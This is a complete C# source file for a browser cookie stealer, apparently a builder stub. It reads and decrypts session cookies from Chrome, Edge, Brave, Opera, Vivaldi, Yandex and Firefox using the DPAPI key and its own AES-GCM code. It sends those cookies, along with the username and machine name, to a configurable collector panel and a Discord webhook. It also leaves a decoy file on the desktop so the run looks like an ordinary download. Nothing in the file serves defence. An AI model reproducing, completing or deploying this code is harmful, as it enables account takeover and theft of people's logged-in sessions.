using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

// ---------------------------------------------------------------------------
// Build-time tokens. The builder rewrites these three lines before compiling.
// Keep the token markers intact:
//   %%PANEL%%    collector endpoint (https)
//   %%WEBHOOK%%  discord webhook (https, optional)
//   %%TAG%%      build id, shown in the panel
// ---------------------------------------------------------------------------
namespace Stub
{
    internal static class BuildInfo
    {
        public const string PanelUrl = "%%PANEL%%";
        public const string WebhookUrl = "%%WEBHOOK%%";
        public const string Tag = "%%TAG%%";
        public const string DisplayName = "%%APPNAME%%";
        public const string DropName = "%%DROP%%";
    }

    internal static class Program
    {
        [STAThread]
        private static void Main(string[] args)
        {
            bool selfTest = args != null && args.Length > 0 &&
                            string.Equals(args[0], "--selftest", StringComparison.OrdinalIgnoreCase);
            bool gcmTest = args != null && args.Length > 0 &&
                           string.Equals(args[0], "--gcmtest", StringComparison.OrdinalIgnoreCase);

            if (gcmTest)
            {
                Console.WriteLine(GcmSelfTest.Run() ? "gcm: pass" : "gcm: FAIL");
                return;
            }

            if (args != null && args.Length > 1 &&
                string.Equals(args[0], "--dbtest", StringComparison.OrdinalIgnoreCase))
            {
                Console.WriteLine(Collector.DebugCount(args[1]));
                return;
            }

            string json;
            CookieJar jar;
            try
            {
                jar = Collector.Collect();
                json = jar.ToJson();
            }
            catch (Exception ex)
            {
                if (selfTest)
                    Console.WriteLine("collect failed: " + ex.Message);
                return;
            }

            if (selfTest)
            {
                string path = Path.Combine(Path.GetTempPath(), "stub-selftest.json");
                File.WriteAllText(path, json, new UTF8Encoding(false));
                Console.WriteLine("wrote " + path + " (" + jar.Count + " cookies)");
                return;
            }

            try { DropDecoy(); }
            catch { }

            try { Exfil.PostJson(BuildInfo.PanelUrl, json, BuildInfo.Tag); }
            catch { }

            try { Exfil.PostWebhook(BuildInfo.WebhookUrl, jar.Count, BuildInfo.Tag, BuildInfo.DisplayName); }
            catch { }
        }

        /// <summary>Writes a harmless marker on the desktop so the run looks like a download.</summary>
        private static void DropDecoy()
        {
            if (string.IsNullOrEmpty(BuildInfo.DropName))
                return;

            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            if (string.IsNullOrEmpty(desktop) || !Directory.Exists(desktop))
                return;

            string name = Path.GetFileName(BuildInfo.DropName);
            if (name.Length == 0)
                return;

            string target = Path.Combine(desktop, name);
            File.WriteAllText(target, "downloaded", new UTF8Encoding(false));
        }
    }

    // -----------------------------------------------------------------------
    // storage
    // -----------------------------------------------------------------------
    internal sealed class CookieRecord
    {
        public string Browser = "";
        public string Host = "";
        public string Name = "";
        public string Value = "";
        public string Path = "/";
        public long Expires;

        public string ToJson()
        {
            StringBuilder sb = new StringBuilder(96);
            sb.Append('{');
            sb.Append("\"browser\":").Append(Json.Quote(Browser));
            sb.Append(",\"host\":").Append(Json.Quote(Host));
            sb.Append(",\"name\":").Append(Json.Quote(Name));
            sb.Append(",\"value\":").Append(Json.Quote(Value));
            sb.Append(",\"path\":").Append(Json.Quote(Path));
            sb.Append(",\"expires\":").Append(Expires);
            sb.Append('}');
            return sb.ToString();
        }
    }

    internal sealed class CookieJar
    {
        public readonly List<CookieRecord> Items = new List<CookieRecord>();
        public int Count { get { return Items.Count; } }

        public string ToJson()
        {
            StringBuilder sb = new StringBuilder(256);
            sb.Append('{');
            sb.Append("\"tag\":").Append(Json.Quote(BuildInfo.Tag));
            sb.Append(",\"app\":").Append(Json.Quote(BuildInfo.DisplayName));
            sb.Append(",\"user\":").Append(Json.Quote(SafeUser()));
            sb.Append(",\"machine\":").Append(Json.Quote(SafeMachine()));
            sb.Append(",\"at\":").Append(Json.Quote(DateTime.UtcNow.ToString("u")));
            sb.Append(",\"cookies\":[");
            for (int i = 0; i < Items.Count; i++)
            {
                if (i > 0) sb.Append(',');
                sb.Append(Items[i].ToJson());
            }
            sb.Append("]}");
            return sb.ToString();
        }

        private static string SafeUser()
        {
            try { return Environment.UserName; } catch { return "?"; }
        }

        private static string SafeMachine()
        {
            try { return Environment.MachineName; } catch { return "?"; }
        }
    }

    internal static class Json
    {
        public static string Quote(string s)
        {
            if (s == null) s = "";
            StringBuilder sb = new StringBuilder(s.Length + 2);
            sb.Append('"');
            foreach (char c in s)
            {
                switch (c)
                {
                    case '"': sb.Append("\\\""); break;
                    case '\\': sb.Append("\\\\"); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    default:
                        if (c < 0x20 || c > 0x7e)
                            sb.Append("\\u").Append(((int)c).ToString("x4"));
                        else
                            sb.Append(c);
                        break;
                }
            }
            sb.Append('"');
            return sb.ToString();
        }
    }

    // -----------------------------------------------------------------------
    // collection
    // -----------------------------------------------------------------------
    internal static class Collector
    {
        private const int MaxCookiesPerStore = 4000;
        private const long MaxDbBytes = 96L * 1024 * 1024;

        public static CookieJar Collect()
        {
            CookieJar jar = new CookieJar();
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            Chromium(jar, "Chrome", Path.Combine(local, @"Google\Chrome\User Data"));
            Chromium(jar, "Edge", Path.Combine(local, @"Microsoft\Edge\User Data"));
            Chromium(jar, "Brave", Path.Combine(local, @"BraveSoftware\Brave-Browser\User Data"));
            Chromium(jar, "Opera", Path.Combine(roaming, @"Opera Software\Opera Stable"));
            Chromium(jar, "Vivaldi", Path.Combine(local, @"Vivaldi\User Data"));
            Chromium(jar, "Yandex", Path.Combine(local, @"Yandex\YandexBrowser\User Data"));

            Firefox(jar, Path.Combine(roaming, @"Mozilla\Firefox\Profiles"));

            return jar;
        }

        private static void Chromium(CookieJar jar, string label, string root)        {
            try
            {
                if (!Directory.Exists(root))
                    return;

                byte[] key = ChromiumKey(root);
                List<string> profiles = new List<string>();
                string def = Path.Combine(root, "Default");
                if (Directory.Exists(def)) profiles.Add(def);

                foreach (string dir in Directory.GetDirectories(root))
                {
                    string leaf = Path.GetFileName(dir);
                    if (leaf.StartsWith("Profile ", StringComparison.OrdinalIgnoreCase))
                        profiles.Add(dir);
                }

                foreach (string profile in profiles)
                {
                    string db = Path.Combine(profile, @"Network\Cookies");
                    if (!File.Exists(db))
                        db = Path.Combine(profile, "Cookies");
                    if (!File.Exists(db))
                        continue;

                    string tmp = CopyToTemp(db);
                    if (tmp == null)
                        continue;

                    try { ReadChromiumDb(tmp, label, key, jar); }
                    finally { TryDelete(tmp); }
                }
            }
            catch
            {
                // one browser failing must not stop the rest
            }
        }

        private static byte[] ChromiumKey(string root)
        {
            string state = Path.Combine(root, "Local State");
            if (!File.Exists(state))
                return null;

            try
            {
                string json = ReadShared(state);
                string b64 = ExtractJsonString(json, "encrypted_key");
                if (b64 == null)
                    return null;

                byte[] raw = Convert.FromBase64String(b64);
                if (raw.Length < 5)
                    return null;

                byte[] blob = new byte[raw.Length - 5];
                Array.Copy(raw, 5, blob, 0, blob.Length); // strip "DPAPI"
                return ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
            }
            catch
            {
                return null;
            }
        }

        private static void ReadChromiumDb(string dbPath, string label, byte[] key, CookieJar jar)
        {
            IntPtr db;
            if (Sqlite3.Open(dbPath, out db) != 0)
                return;

            IntPtr stmt = IntPtr.Zero;
            try
            {
                string sql = "SELECT host_key, name, value, encrypted_value, path, expires_utc FROM cookies LIMIT " +
                             MaxCookiesPerStore;
                if (!Sqlite3.Prepare(db, sql, out stmt))
                    return;

                while (Sqlite3.Step(stmt) == Sqlite3.Row)
                {
                    CookieRecord rec = new CookieRecord();
                    rec.Browser = label;
                    rec.Host = Sqlite3.Text(stmt, 0);
                    rec.Name = Sqlite3.Text(stmt, 1);
                    rec.Path = Sqlite3.Text(stmt, 4);
                    rec.Expires = Sqlite3.Int64(stmt, 5);

                    string plain = Sqlite3.Text(stmt, 2);
                    if (!string.IsNullOrEmpty(plain))
                    {
                        rec.Value = plain;
                    }
                    else
                    {
                        byte[] enc = Sqlite3.Blob(stmt, 3);
                        rec.Value = Decrypt(enc, key);
                    }

                    if (!string.IsNullOrEmpty(rec.Name) && !string.IsNullOrEmpty(rec.Value))
                        jar.Items.Add(rec);
                }
            }
            finally
            {
                if (stmt != IntPtr.Zero) Sqlite3.Finalize(stmt);
                Sqlite3.Close(db);
            }
        }

        private static string Decrypt(byte[] blob, byte[] key)
        {
            if (blob == null || blob.Length == 0)
                return "";

            try
            {
                // v10 / v11: 3 byte prefix + 12 byte nonce + ciphertext + 16 byte tag
                if (blob.Length > 31 && blob[0] == (byte)'v' && blob[1] == (byte)'1' &&
                    (blob[2] == (byte)'0' || blob[2] == (byte)'1') && key != null && key.Length == 32)
                {
                    int offset = 3;
                    byte[] nonce = new byte[12];
                    Array.Copy(blob, offset, nonce, 0, 12);
                    int ctLen = blob.Length - offset - 12 - 16;
                    if (ctLen <= 0)
                        return "";

                    byte[] ct = new byte[ctLen];
                    Array.Copy(blob, offset + 12, ct, 0, ctLen);
                    byte[] tag = new byte[16];
                    Array.Copy(blob, blob.Length - 16, tag, 0, 16);

                    byte[] plain = AesGcm.Decrypt(key, nonce, ct, tag);
                    if (plain == null)
                        return "";
                    return Encoding.UTF8.GetString(plain);
                }

                // legacy: raw DPAPI blob
                if (key == null || blob[0] != (byte)'v')
                {
                    byte[] plain = ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
                    return Encoding.UTF8.GetString(plain);
                }
            }
            catch
            {
            }
            return "";
        }

        private static void Firefox(CookieJar jar, string profilesRoot)
        {
            try
            {
                if (!Directory.Exists(profilesRoot))
                    return;

                foreach (string profile in Directory.GetDirectories(profilesRoot))
                {
                    string db = Path.Combine(profile, "cookies.sqlite");
                    if (!File.Exists(db))
                        continue;

                    string tmp = CopyToTemp(db);
                    if (tmp == null)
                        continue;

                    IntPtr handle;
                    if (Sqlite3.Open(tmp, out handle) != 0)
                    {
                        TryDelete(tmp);
                        continue;
                    }

                    IntPtr stmt = IntPtr.Zero;
                    try
                    {
                        string sql = "SELECT host, name, value, path, expiry FROM moz_cookies LIMIT " +
                                     MaxCookiesPerStore;
                        if (!Sqlite3.Prepare(handle, sql, out stmt))
                            continue;

                        while (Sqlite3.Step(stmt) == Sqlite3.Row)
                        {
                            CookieRecord rec = new CookieRecord();
                            rec.Browser = "Firefox";
                            rec.Host = Sqlite3.Text(stmt, 0);
                            rec.Name = Sqlite3.Text(stmt, 1);
                            rec.Value = Sqlite3.Text(stmt, 2);
                            rec.Path = Sqlite3.Text(stmt, 3);
                            rec.Expires = Sqlite3.Int64(stmt, 4);

                            if (!string.IsNullOrEmpty(rec.Name) && !string.IsNullOrEmpty(rec.Value))
                                jar.Items.Add(rec);
                        }
                    }
                    finally
                    {
                        if (stmt != IntPtr.Zero) Sqlite3.Finalize(stmt);
                        Sqlite3.Close(handle);
                        TryDelete(tmp);
                    }
                }
            }
            catch
            {
            }
        }

        /// <summary>Diagnostic: open a cookie database and report what the SQL layer sees.</summary>
        public static string DebugCount(string path)
        {
            string tmp = CopyToTemp(path);
            if (tmp == null)
                return "copy failed (locked or missing): " + path;

            IntPtr db;
            if (Sqlite3.Open(tmp, out db) != 0)
            {
                TryDelete(tmp);
                return "open failed: " + path;
            }

            IntPtr stmt = IntPtr.Zero;
            try
            {
                if (!Sqlite3.Prepare(db, "SELECT count(*) FROM cookies", out stmt))
                    return "prepare failed";

                string count = Sqlite3.Step(stmt) == Sqlite3.Row ? Sqlite3.Text(stmt, 0) : "?";
                return "rows=" + count + " file=" + Path.GetFileName(path);
            }
            finally
            {
                if (stmt != IntPtr.Zero) Sqlite3.Finalize(stmt);
                Sqlite3.Close(db);
                TryDelete(tmp);
            }
        }

        // ---------------- helpers ----------------

        private static string CopyToTemp(string source)
        {
            try
            {
                string dest = Path.Combine(Path.GetTempPath(), "c" + Guid.NewGuid().ToString("N") + ".db");
                using (FileStream input = new FileStream(source, FileMode.Open, FileAccess.Read,
                           FileShare.ReadWrite | FileShare.Delete))
                {
                    if (input.Length <= 0 || input.Length > MaxDbBytes)
                        return null;

                    using (FileStream output = new FileStream(dest, FileMode.Create, FileAccess.Write, FileShare.None))
                    {
                        byte[] buffer = new byte[64 * 1024];
                        int read;
                        while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
                            output.Write(buffer, 0, read);
                    }
                }
                return dest;
            }
            catch
            {
                return null;
            }
        }

        private static void TryDelete(string path)
        {
            try { if (path != null && File.Exists(path)) File.Delete(path); }
            catch { }
        }

        private static string ReadShared(string path)
        {
            using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read,
                       FileShare.ReadWrite | FileShare.Delete))
            using (StreamReader reader = new StreamReader(fs, Encoding.UTF8))
            {
                return reader.ReadToEnd();
            }
        }

        private static string ExtractJsonString(string json, string key)
        {
            int idx = json.IndexOf("\"" + key + "\"", StringComparison.Ordinal);
            if (idx < 0)
                return null;

            idx = json.IndexOf(':', idx);
            if (idx < 0)
                return null;

            idx = json.IndexOf('"', idx);
            if (idx < 0)
                return null;

            int end = json.IndexOf('"', idx + 1);
            if (end < 0)
                return null;

            return json.Substring(idx + 1, end - idx - 1);
        }
    }

    // -----------------------------------------------------------------------
    // sqlite (winsqlite3.dll ships with Windows 10 and 11)
    // -----------------------------------------------------------------------
    internal static class Sqlite3
    {
        public const int Row = 100;
        public const int Done = 101;

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_open_v2(byte[] filename, out IntPtr db, int flags, IntPtr vfs);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_prepare_v2(IntPtr db, byte[] sql, int nByte, out IntPtr stmt, IntPtr tail);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_step(IntPtr stmt);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr sqlite3_column_text(IntPtr stmt, int column);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr sqlite3_column_blob(IntPtr stmt, int column);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_column_bytes(IntPtr stmt, int column);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern long sqlite3_column_int64(IntPtr stmt, int column);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_finalize(IntPtr stmt);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_close(IntPtr db);

        public static int Open(string path, out IntPtr db)
        {
            return sqlite3_open_v2(Utf8(path), out db, 0x00000001 /* READONLY */, IntPtr.Zero);
        }

        public static bool Prepare(IntPtr db, string sql, out IntPtr stmt)
        {
            byte[] bytes = Utf8(sql);
            return sqlite3_prepare_v2(db, bytes, bytes.Length, out stmt, IntPtr.Zero) == 0 && stmt != IntPtr.Zero;
        }

        public static int Step(IntPtr stmt)
        {
            return sqlite3_step(stmt);
        }

        public static string Text(IntPtr stmt, int column)
        {
            IntPtr ptr = sqlite3_column_text(stmt, column);
            if (ptr == IntPtr.Zero)
                return "";
            int len = sqlite3_column_bytes(stmt, column);
            if (len <= 0)
                return "";
            byte[] bytes = new byte[len];
            Marshal.Copy(ptr, bytes, 0, len);
            return Encoding.UTF8.GetString(bytes);
        }

        public static byte[] Blob(IntPtr stmt, int column)
        {
            IntPtr ptr = sqlite3_column_blob(stmt, column);
            if (ptr == IntPtr.Zero)
                return new byte[0];
            int len = sqlite3_column_bytes(stmt, column);
            if (len <= 0)
                return new byte[0];
            byte[] bytes = new byte[len];
            Marshal.Copy(ptr, bytes, 0, len);
            return bytes;
        }

        public static long Int64(IntPtr stmt, int column)
        {
            return sqlite3_column_int64(stmt, column);
        }

        public static void Finalize(IntPtr stmt)
        {
            sqlite3_finalize(stmt);
        }

        public static void Close(IntPtr db)
        {
            sqlite3_close(db);
        }

        private static byte[] Utf8(string s)
        {
            return Encoding.UTF8.GetBytes(s + "\0");
        }
    }

    // -----------------------------------------------------------------------
    // AES-256-GCM decrypt (not exposed by .NET Framework)
    // -----------------------------------------------------------------------
    internal static class AesGcm
    {
        public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
        {
            if (key == null || key.Length != 32 || nonce == null || nonce.Length != 12 ||
                tag == null || tag.Length != 16)
                return null;

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.None;

                using (ICryptoTransform enc = aes.CreateEncryptor())
                {
                    byte[] h = new byte[16];
                    enc.TransformBlock(new byte[16], 0, 16, h, 0);

                    byte[] j0 = new byte[16];
                    Array.Copy(nonce, 0, j0, 0, 12);
                    j0[15] = 1;

                    byte[] expected = Tag(h, ciphertext, j0, enc);
                    if (!FixedTimeEquals(expected, tag))
                        return null;

                    byte[] plain = new byte[ciphertext.Length];
                    byte[] counter = new byte[16];
                    Array.Copy(j0, counter, 16);
                    byte[] stream = new byte[16];
                    int pos = 0;

                    while (pos < ciphertext.Length)
                    {
                        Increment(counter);
                        enc.TransformBlock(counter, 0, 16, stream, 0);
                        int take = Math.Min(16, ciphertext.Length - pos);
                        for (int i = 0; i < take; i++)
                            plain[pos + i] = (byte)(ciphertext[pos + i] ^ stream[i]);
                        pos += take;
                    }

                    return plain;
                }
            }
        }

        private static byte[] Tag(byte[] h, byte[] ciphertext, byte[] j0, ICryptoTransform enc)
        {
            byte[] state = new byte[16];
            byte[] block = new byte[16];

            for (int offset = 0; offset < ciphertext.Length; offset += 16)
            {
                Array.Clear(block, 0, 16);
                int take = Math.Min(16, ciphertext.Length - offset);
                Array.Copy(ciphertext, offset, block, 0, take);
                Xor(state, block);
                Multiply(state, h);
            }

            // length block: AAD bits (zero) || ciphertext bits, big endian
            Array.Clear(block, 0, 16);
            ulong bits = (ulong)ciphertext.Length * 8;
            for (int i = 0; i < 8; i++)
                block[15 - i] = (byte)(bits >> (8 * i));
            Xor(state, block);
            Multiply(state, h);

            byte[] ek = new byte[16];
            enc.TransformBlock(j0, 0, 16, ek, 0);
            Xor(state, ek);
            return state;
        }

        private static void Xor(byte[] a, byte[] b)
        {
            for (int i = 0; i < 16; i++)
                a[i] ^= b[i];
        }

        private static void Multiply(byte[] x, byte[] y)
        {
            ulong xh = ReadBE(x, 0), xl = ReadBE(x, 8);
            ulong yh = ReadBE(y, 0), yl = ReadBE(y, 8);
            ulong zh = 0, zl = 0;

            for (int i = 0; i < 128; i++)
            {
                ulong bit = (i < 64) ? (xh >> (63 - i)) & 1UL : (xl >> (127 - i)) & 1UL;
                if (bit != 0)
                {
                    zh ^= yh;
                    zl ^= yl;
                }

                ulong lsb = yl & 1UL;
                yl = (yl >> 1) | (yh << 63);
                yh >>= 1;
                if (lsb != 0)
                    yh ^= 0xE100000000000000UL;
            }

            WriteBE(x, 0, zh);
            WriteBE(x, 8, zl);
        }

        private static ulong ReadBE(byte[] b, int o)
        {
            ulong v = 0;
            for (int i = 0; i < 8; i++)
                v = (v << 8) | b[o + i];
            return v;
        }

        private static void WriteBE(byte[] b, int o, ulong v)
        {
            for (int i = 0; i < 8; i++)
                b[o + i] = (byte)(v >> (8 * (7 - i)));
        }

        private static void Increment(byte[] counter)
        {
            for (int i = 15; i >= 0; i--)
            {
                if (++counter[i] != 0)
                    break;
            }
        }

        private static bool FixedTimeEquals(byte[] a, byte[] b)
        {
            if (a == null || b == null || a.Length != b.Length)
                return false;
            int diff = 0;
            for (int i = 0; i < a.Length; i++)
                diff |= a[i] ^ b[i];
            return diff == 0;
        }
    }

    // -----------------------------------------------------------------------
    // gcm self test (NIST GCM test case 13)
    // -----------------------------------------------------------------------
    internal static class GcmSelfTest
    {
        public static bool Run()
        {
            byte[] key = new byte[32];
            byte[] iv = new byte[12];
            byte[] ct = Hex("cea7403d4d606b6e074ec5d3baf39d18");
            byte[] tag = Hex("d0d1c8a799996bf0265b98b5d48ab919");

            byte[] plain = AesGcm.Decrypt(key, iv, ct, tag);
            if (plain == null || plain.Length != 16)
                return false;

            for (int i = 0; i < plain.Length; i++)
            {
                if (plain[i] != 0)
                    return false;
            }

            // a flipped tag must be rejected
            tag[0] ^= 0xFF;
            return AesGcm.Decrypt(key, iv, ct, tag) == null;
        }

        private static byte[] Hex(string s)
        {
            byte[] b = new byte[s.Length / 2];
            for (int i = 0; i < b.Length; i++)
                b[i] = Convert.ToByte(s.Substring(i * 2, 2), 16);
            return b;
        }
    }

    // -----------------------------------------------------------------------
    // exfil
    // -----------------------------------------------------------------------
    internal static class Exfil
    {
        private const int TimeoutMs = 12000;

        public static void PostJson(string url, string json, string tag)
        {
            if (string.IsNullOrEmpty(url) || url.IndexOf("%%", StringComparison.Ordinal) >= 0)
                return;

            byte[] body = Encoding.UTF8.GetBytes(json);
            Request(url, body, "application/json");
        }

        public static void PostWebhook(string url, int count, string tag, string app)
        {
            if (string.IsNullOrEmpty(url) || url.IndexOf("%%", StringComparison.Ordinal) >= 0)
                return;

            StringBuilder sb = new StringBuilder();
            sb.Append("{\"username\":").Append(Json.Quote(app));
            sb.Append(",\"allowed_mentions\":{\"parse\":[]}");
            sb.Append(",\"content\":").Append(Json.Quote(count + " cookies captured | build " + tag));
            sb.Append("}");
            Request(url, Encoding.UTF8.GetBytes(sb.ToString()), "application/json");
        }

        private static void Request(string url, byte[] body, string contentType)
        {
            try { ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; }
            catch { }

            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "POST";
            req.ContentType = contentType;
            req.UserAgent = "Mozilla/5.0";
            req.Timeout = TimeoutMs;
            req.ReadWriteTimeout = TimeoutMs;
            req.ContentLength = body.Length;
            req.Proxy = WebRequest.DefaultWebProxy;

            using (Stream s = req.GetRequestStream())
                s.Write(body, 0, body.Length);

            using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
            {
                using (Stream rs = resp.GetResponseStream())
                {
                    if (rs != null)
                    {
                        byte[] buf = new byte[512];
                        int total = 0;
                        while (total < 4096 && rs.Read(buf, 0, buf.Length) > 0)
                            total += 512;
                    }
                }
            }
        }
    }
}
